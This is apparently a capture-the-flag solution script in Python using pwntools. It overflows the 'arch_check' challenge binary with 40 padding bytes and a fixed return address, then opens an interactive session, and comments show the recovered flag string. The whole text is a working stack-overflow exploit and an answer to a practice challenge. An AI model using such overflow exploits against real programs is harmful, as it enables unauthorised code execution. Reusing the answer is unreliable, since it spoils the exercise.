# $ find . -name "flag"
# ./home/arch_check/flag
# $ cat ./home/arch_check/flag
# FLAG{d1d_y0u_ju5t_s4y_w1nd0w5?}

from pwn import *

payload = flat(
    ['a'*40, p64(0x00000000004011dd)]
)

p = process("./arch_check")
p.recv()
p.sendline(payload)
p.recv()
p.interactive()
